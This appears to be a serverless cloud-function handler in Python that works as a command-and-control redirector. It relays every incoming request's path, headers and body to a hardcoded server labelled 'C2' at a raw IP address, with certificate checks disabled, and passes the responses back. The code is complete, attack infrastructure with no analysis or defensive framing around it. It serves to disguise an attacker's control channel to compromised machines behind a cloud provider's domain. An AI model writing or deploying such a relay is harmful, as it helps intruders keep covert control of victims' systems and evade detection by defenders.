# -*- coding: utf-8 -*-

import json
import requests

def main_handler(event, context):
    C2 = 'https://139.199.157.125:443'
    path = event.get('path','/')
    headers = event.get('headers', {})
    method = event.get('httpMethod', 'GET')
    print("Incoming event:",event)
    
    try:
        if method == 'GET':
            resp = requests.get(C2 + path,headers=headers, verify=False)
        else:
            resp = requests.post(C2 + path, data=event.get('body',''), headers=headers, verify=False)
        
        print("Response headers:",resp.headers)
            
        print("Response content:",resp.content)
            
        # Return raw response body(no base64),decode to string for JSON transport
        
        response = {
            "isBase64Encoded": False,
            "statusCode": resp.status_code,
            "headers":{
                "Content-Type": resp.headers.get("Content-Type", "text/plain")
            },
            "body": resp.content.decode(errors='ignore') # decode raw bytes for text-based response
        }
    
    except Exception as e:
        print("Error:",str(e))
        response = {
            "isBase64Encoded":False,
            "statusCode": 502,
            "headers":{
                "Content-Type":"text/plain"
            },
            "body":"Upstream request failed:" + str(e)
        }

    return response
